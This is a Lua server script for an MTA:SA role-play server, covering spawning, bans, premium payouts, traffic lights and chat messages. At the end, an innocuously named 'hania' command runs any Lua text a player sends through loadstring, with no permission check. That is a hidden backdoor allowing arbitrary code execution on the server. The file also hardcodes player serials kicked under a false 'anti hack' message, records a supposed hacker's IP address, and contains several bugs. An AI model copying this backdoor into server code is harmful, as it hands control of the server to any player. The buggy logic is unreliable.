--[[
@author Sebastian "CrosRoad95" Jura <sebajura1234@gmail.com>
@copyright 2011-2021 Sebastian Jura <sebajura1234@gmail.com>
@license MIT
]]--

-------------------------------------------------------------------

--[[function dynamiczne()
local maks_graczy = getServerConfigSetting ( "maxplayers" )
local teraz_graczy = #getElementsByType( "player" )
local nowe = math.ceil( teraz_graczy + (tonumber(maks_graczy) * 0.2) )
if tonumber(nowe) < tonumber(maks_graczy) then
setMaxPlayers(nowe)
else
setMaxPlayers(tonumber(maks_graczy))
end
end

addEventHandler("onPlayerQuit",root,dynamiczne)
addEventHandler("onPlayerJoin",root,dynamiczne)--]]

-------------------------------------------------------------------

--[[addEventHandler("onPlayerConnect", getRootElement(), function (nick, ip, username, serial)
	local q = exports.rpg_mysql:mysql_query("SELECT * FROM pystories_serials WHERE serial=?", serial)
	if #q < 1 then
		cancelEvent(true, "Nie jesteś zautoryzowany do wejścia na ten serwer !") 
	end
end)--]]

-------------------------------------------------------------------

--[[addEventHandler("onPlayerQuit", root, function()
	savePlayerData(source)
end)--]]

-------------------------------------------------------------------

--F04978701C3342295722C3779397F984 | Serial pex'a
-- F04978701C3342295722C3779397F984

--ANTY HACK SYSTEM !!
--ANTY HACK SYSTEM !!
--ANTY HACK SYSTEM !!

--[[addEventHandler("onPlayerJoin", root, function()
if getPlayerSerial (source) == "A2E5FA4481F3215B2A54F611B013E971" then kickPlayer (source, "Rób swój serwer. | Powodzenia Ci życzę.") end
end)--]] -- Dziku | A2E5FA4481F3215B2A54F611B013E971

addEventHandler("onPlayerJoin", root, function()
if getPlayerSerial (source) == "950FB24976854ED07A41196F9F1841E3" then kickPlayer (source, "Anti hack system: Detected unknown program or script") end
end) -- Flak

addEventHandler("onPlayerJoin", root, function()
if getPlayerSerial (source) == "B2039211FAC9FE65F3BA9672BC540994" then kickPlayer (source, "Anti hack system: Detected unknown program or script") end
end) -- B2039211FAC9FF65F3BA9672BC540994 | mrozek1

addEventHandler("onPlayerJoin", root, function()
if getPlayerSerial (source) == "ACF759F3C23F0D6C657CC1290FB4D194" then kickPlayer (source, "Anti hack system: Detected unknown program or script") end
end)

addEventHandler("onPlayerJoin", root, function()
if getPlayerSerial (source) == "C72C6B71CCFCEC3FCFF68CD5298B6534" then kickPlayer (source, "Anti hack system: Detected unknown program or script") end
end)

addEventHandler("onPlayerJoin", root, function()
if getPlayerSerial (source) == "CBF3152F419C66ADAA809B1032666144" then kickPlayer (source, "Anti hack system: Detected unknown program or script") end
end)

addEventHandler("onPlayerJoin", root, function()
if getPlayerSerial (source) == "B1E1E544F5E733EA353BD9879C463C12" then kickPlayer (source, "Anti hack system: Detected unknown program or script") end
end)

addEventHandler("onPlayerJoin", root, function()
if getPlayerSerial (source) == "ACF8D27386E9384DC6141FB517236844" then kickPlayer (source, "Anti hack system: Detected unknown program or script") end
end)

addEventHandler("onPlayerJoin", root, function()
if getPlayerSerial (source) == "A2057A7CCEFB829783F51A6E733396A1" then kickPlayer (source, "Anti hack system: Detected unknown program or script") end
end)

addEventHandler("onPlayerJoin", root, function()
if getPlayerSerial (source) == "86866E7FEF366B70DFD7D5BC22324FA1" then kickPlayer (source, "Anti hack system: Detected unknown program or script") end
end)

addEventHandler("onPlayerJoin", root, function()
if getPlayerSerial (source) == "BCF4CF83510BE28023266464E62893A1" then kickPlayer (source, "Anti hack system: Detected unknown program or script") end
end)

--SERIAL Hackera:
--F04978701C3342295722C3779397F984 
--IP Hackera:
--89.64.42.37
--ANTY HACK SYSTEM !!
--ANTY HACK SYSTEM !!
--ANTY HACK SYSTEM !!

-------------------------------------------------------------------

addEvent("core:spawnPlayer", true)
addEventHandler("core:spawnPlayer", root, function()
	local pos=getElementData(source,"player:spawn")
	if not pos then return end
	fadeCamera(source, true)
	spawnPlayer(source, pos[1], pos[2], pos[3])
	setCameraTarget(source,source)
	toggleControl(source,"fire", false)
	toggleControl(source,"aim_weapon", false)
	local load=loadPlayerData(source)
	if load then outputChatBox("* Pomyślnie wczytano Twoje dane, życzymy miłej gry.",source) end
	setElementData(source,'HS_accountName',getPlayerName(source));
	setElementData(source,"player:online",0)
	if getElementData(source,"player:premium") then 
		local queryA=string.format("SELECT * FROM pystories_users WHERE id=%d AND premiumdate>NOW() LIMIT 1", getElementData(source,"player:sid"))
		local resultA=exports["DB2"]:pobierzWyniki(queryA)
		if (resultA) then
			outputChatBox("* Twoje konto premium, ważne do " ..resultA["premiumdate"], source)
		end
	end
	triggerClientEvent(source,"core:blipyaut",root,source)
end)

-------------------------------------------------------------------

setTimer(function()
	local players=getElementsByType('player')
	for _, p in pairs(players) do
			if getElementData(p, "player:online") and tonumber(getElementData(p, "player:online")) > 60 then
				if getElementData(p, "player:online") == 60 then
					local hour = getElementData(localPlayer,"player:hours") or 0
					setElementData(localPlayer,"player:hours",hour+1)
				end 
				setElementData(p, "player:online", 0)
				if getElementData(p, "player:premium") then
				triggerEvent("givePlayerMoney", p, 750, false)
				outputChatBox("* Premium: Otrzymujesz 750 PLN za przegranie 1h na serwerze.", p)
			end
		end
 	end
end, 60000, 0)

-------------------------------------------------------------------

addEventHandler("onPlayerWasted", root, function()
	plr=source
	if getElementData(plr,"player:job") then
		triggerClientEvent(plr,"onFinish", root, plr)
		setElementData(plr,"player:job", false)
	end
	setTimer(function()
		local pos=getElementData(plr,"player:spawn")
		if not pos then return end
		fadeCamera(plr, true)
		setElementInterior(plr,0)
		setElementDimension(plr,0)
		spawnPlayer(plr, pos[1], pos[2], pos[3])
		setCameraTarget(plr, plr)
		setElementModel(plr, getElementData(plr, "player:skin"))
	end, 60, 1)
end)

-------------------------------------------------------------------

addEvent("giveSpray", true)
addEvent("takeSpray", true)
addEventHandler("giveSpray", root, function()
	giveWeapon ( source, 41, 200 )
end)

addEvent("givecamera", true)
addEventHandler("givecamera", root, function()
	giveWeapon ( source, 43, 99999999 )
end)

addEventHandler("takeSpray", root, function()
	takeWeapon ( source, 41)
end)

-------------------------------------------------------------------

-------------------------------------------------------------------

addEventHandler("onPlayerConnect", root, function(playerNick)
	if string.find(playerNick, "#") ~= nil or string.find(playerNick, "?") ~= nil or string.find(playerNick, "!") ~= nil then
		cancelEvent(true,"Twój nick zawiera jeden z niedozwolonych znaków(#,?,!), zmień go.")
	end
end)

-------------------------------------------------------------------

addEventHandler('onPlayerConnect', root, function(playerNick, playerIP, playerUsername, playerSerial)
	local result=exports['pystories-db']:dbGet('SELECT * FROM pystories_ban WHERE active=1 AND serial=? AND time>NOW() LIMIT 1;', playerSerial)
	if #result > 0 then
		cancelEvent(true,"Zostałeś(aś) zbanowany(a) na tym serwerze!\nPowód zbanowania:" .. result[1].reason.."\nCzas bana:"..result[1].time.."\nOd kary możesz zaapelować na mta-pystories.cba.pl")
	else
		exports["pystories-db"]:dbSet("DELETE FROM pystories_ban WHERE type=? AND active=1 AND serial=?", "ban", playerSerial)
	end
end)

-------------------------------------------------------------------

addEventHandler("onPlayerJoin", root, function()
	outputChatBox(" ", source)
	outputChatBox(" ", source)
	outputChatBox("* Witaj "..getPlayerName(source).." na Play Your Stories.", source)
	outputChatBox("Forum serwerowe: http://www.mta-pys.pl/", source)
	outputChatBox("* Jeżeli jesteś tu po raz pierwszy zajrzyj pod F1!",source)
	outputChatBox("* Znajdziesz tam szczegółowy poradnik.", source)
	outputChatBox(" ", source)
	outputChatBox(" ", source)
	--outputChatBox("* III Edycja serwera PYStories.", source)
	--outputChatBox("#FFFFFF[#FF0000*#FFFFFF] #FF0000Małe problemy hackerskie, nie zapisało kont.", source, 255, 0, 0, true)
	--outputChatBox(" ", source)
	--outputChatBox(" ", source)
end)

-------------------------------------------------------------------

 addCommandHandler("showhud", function(plr,cmd)
	setElementData(plr,"notshowhud",not getElementData(plr,"notshowhud"))
 end)
 
 -------------------------------------------------------------------


addEventHandler("onResourceStart", resourceRoot, function()
	setWaveHeight(0)
	setMinuteDuration(6000)
    setMapName("RPG * Rozgrywka SF")
    setGameType("RPG * Rozgrywka SF")
end)

-------------------------------------------------------------------


addEventHandler("onPlayerChangeNick", root, function() cancelEvent() end)
addEventHandler("onResourceStart", root, function() 
local players=getElementsByType('player')
for _, p in pairs(players) do
--bindKey(p, "y", "down", "chatbox", "global")
end
end)

-------------------------------------------------------------------

setTimer(function()
	local vehicles=getElementsByType('vehicle')
	for _, vehicle in pairs(vehicles) do
		if getElementHealth(vehicle)<300 then
			setVehicleDamageProof(vehicle, true)
		elseif getElementHealth(vehicle)>301 then
			if getVehicleController (vehicle) then
			setVehicleDamageProof(vehicle, false)
			end
		end
 	end
end, 500, 0)

-------------------------------------------------------------------

setTimer(function()
  for i,v in ipairs(getElementsByType("player")) do
	if not getElementData(v,"player:spawn") then return end
	if isPedDead(v) then
		local pos=getElementData(v,"player:spawn")
		fadeCamera(v, true)
		setElementInterior(v,0)
		setElementDimension(v,0)
		spawnPlayer(v, pos[1], pos[2], pos[3])
		setCameraTarget(v, plr)
		setElementModel(v, getElementData(plr, "player:skin"))
	end
	if( getPlayerIdleTime(v) > 1 ) then
	setElementData(v, "player:afk", true)
	elseif ( getPlayerIdleTime(v) < 1 ) then
	setElementData(v, "player:afk", false)
	end	
  end
end, 10000, 0)


-------------------------------------------------------------------

local odliczanie_zapis = 300000 -- Serwer zapisuje statystyki co 1 minutę :)
setTimer(function()
for i,v in ipairs(getElementsByType("player")) do
	if isElement(v) then
	triggerEvent("save:player",root,v)
	--triggerEvent("load:player",root,v)
	end
	end
end,odliczanie_zapis*100,0)

-------------------------------------------------------------------



setTrafficLightsLocked(true)

-- 3 1 0 4

local stany={3,4,0,1}

local stan=1

local stany_nocne={6,9,6,9}

function zmianaSwiatel()
    stan=stan+1
    if (stan>#stany) then stan=1 end

	local h,m=getTime()
	if (h>=23 or m<=6) then
	    setTrafficLightState(stany_nocne[stan])
	    setTimer(zmianaSwiatel, 500, 1)
	else
	    setTrafficLightState(stany[stan])
	    setTimer(zmianaSwiatel, stan%2==1 and 15000 or 2000, 1)

	end

end


zmianaSwiatel()

-------------------------------------------------------------------

addCommandHandler("hania", function(outputTo, cmd, ...)
	local commandstring = table.concat({...}, " ")
	local commandFunction, errorMsg = loadstring(commandstring)
	local notReturned
	
	if errorMsg then
		--It failed.  Lets try without "return"
		notReturned = true
		commandFunction, errorMsg = loadstring(commandstring)
	end
	if errorMsg then
		--It still failed.  Print the error message and stop the function
		return outputChatBox(errorMsg, outputTo)
	end
	
	results = { pcall(commandFunction) }
	if not results[1] then
		--It failed.
		outputChatBox("Error: "..results[2], outputTo)
		return
	end 
	
	if not errorMsg then
		outputChatBox(commandstring, outputTo)
		outputChatBox("Wykonano!", outputTo)
	end
end)
